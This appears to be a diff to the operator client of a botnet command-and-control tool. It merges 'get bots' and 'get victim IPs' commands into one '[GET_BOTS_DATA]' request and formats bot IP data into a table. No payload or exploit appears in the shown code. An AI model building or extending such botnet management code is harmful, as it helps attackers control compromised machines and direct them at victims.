@@ -12,17 +12,11 @@ manager::manager(io::io_context& io_context, std::uint16_t port, std::string ser
 	     boost::bind(&manager::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
 	    {"[INIT]",
 	     boost::bind(&manager::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
-	    {"[GET_BOTS]", boost::bind(&manager::handleGetBots, this, boost::placeholders::_1, boost::placeholders::_2,
-				       boost::placeholders::_3)},
-	    {"[GET_IPS]", boost::bind(&manager::handleGetIps, this, boost::placeholders::_1, boost::placeholders::_2,
-				      boost::placeholders::_3)},
+	    {"[GET_BOTS_DATA]", boost::bind(&manager::handleGetBotsData, this, boost::placeholders::_1, boost::placeholders::_2,
+					    boost::placeholders::_3)},
 	};
 	interactive_.menu_handlers_ = {
-	    {"* Update victim list", boost::bind(&manager::getIps, this)},
-	    {"* Update bot list", boost::bind(&manager::getBots, this)},
-	    // {"Remove bot", boost::bind(&manager::removeBot, this)},
-	    // {"Remove victim", boost::bind(&manager::removeIp, this)},
-	    // {"Add victim", boost::bind(&manager::addIp, this)},
+	    {"u", boost::bind(&manager::getBotsData, this)},
 	};
 }
 
@@ -66,24 +60,44 @@ void manager::handleInit(std::string& command, std::vector<std::string>& params,
 	}
 }
 
-void manager::handleGetBots(std::string& command, std::vector<std::string>& params, session* server) {
+void manager::handleGetBotsData(std::string& command, std::vector<std::string>& params, session* server) {
 	if (!params.size()) return;
-	interactive_.updateBots(params);
+	std::string curr;
+	int parameters_num = stoi(params[0]);
+	std::vector<int> max_value_size(parameters_num, 0);
+
+	for (int i = 1; i < params.size(); ++i) {
+		for (int j = 0; j < parameters_num; ++j) {
+			curr = params[i + j];
+
+			if (max_value_size[j] < curr.size()) {
+				max_value_size[j] = curr.size();
+			}
+			if (j == 0) {
+				bot_ip_addresses_.push_back(curr);
+			}
+		}
+		i += parameters_num - 1;
+	}
+
+	std::vector<std::string> data_output;
+	std::string separator = std::string(10, ' ');
+
+	for (int i = 1 + parameters_num ; i < params.size(); ++i) {
+		std::vector<std::string> line;
+
+		for (int j = 0; j < parameters_num; ++j) {
+			line.push_back(params[i + j] + std::string(max_value_size[j] - params[i + j].size(), ' '));
+		}
+		data_output.push_back(boost::algorithm::join(line, separator));
+		i += parameters_num - 1;
+	}
+	interactive_.updateBots(data_output);
+    interactive_.updateTitles(params, max_value_size, separator);
 }
 
-void manager::handleGetIps(std::string& command, std::vector<std::string>& params, session* server) {
-	if (!params.size()) return;
-	interactive_.updateVictims(params);
-}
-
-void manager::getBots() {
+void manager::getBotsData() {
 	std::vector<std::string> output_params{passphrase_};
-	std::string command = "[GET_BOTS]";
-	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
-}
-
-void manager::getIps() {
-	std::vector<std::string> output_params{passphrase_};
-	std::string command = "[GET_IPS]";
+	std::string command = "[GET_BOTS_DATA]";
 	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
 }
